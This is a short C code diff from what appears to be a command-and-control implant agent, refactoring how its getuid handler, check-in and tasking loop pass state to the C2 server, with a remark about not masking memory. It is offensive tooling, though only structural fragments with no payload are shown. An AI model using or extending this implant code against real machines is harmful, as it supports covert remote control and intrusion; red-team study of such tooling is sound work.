@@ -41,7 +41,7 @@ void agent_exit(AgentState *state, AgentCapabilities *cap) {
 	#endif
 }
 
-void agent_getuid(AgentState *state, AgentCapabilities *cap) {
+void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	char *username = cap->GetuidPicoEntrypoint();
 	
 	// TODO communicate data or error to C2
@@ -62,7 +62,7 @@ void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
 		dprintf("Received getuid command.");
 		#endif
 		
-		agent_getuid(state, cap);
+		agent_getuid(state, cap, task);
 		return;
 	}
 	
@@ -94,7 +94,7 @@ void go() {
 	#endif
 	
 	CheckinReply checkin_reply = { 0 };
-	perform_checkin(&state.params, &capabilities, state.http, &checkin_reply);
+	perform_checkin(&state, &capabilities, &checkin_reply);
 	
 	if ((checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
 		#ifdef CELEBI_DEBUG
@@ -116,7 +116,7 @@ void go() {
 	while (1) {
 		// Look ma, no masking!
 		TaskingReply tasking_reply = { 0 };
-		perform_tasking(&state.params, state.http, &tasking_reply);
+		perform_tasking(&state, &tasking_reply);
 		
 		#ifdef CELEBI_DEBUG
 		dprintf("Received tasking from C2 server!");
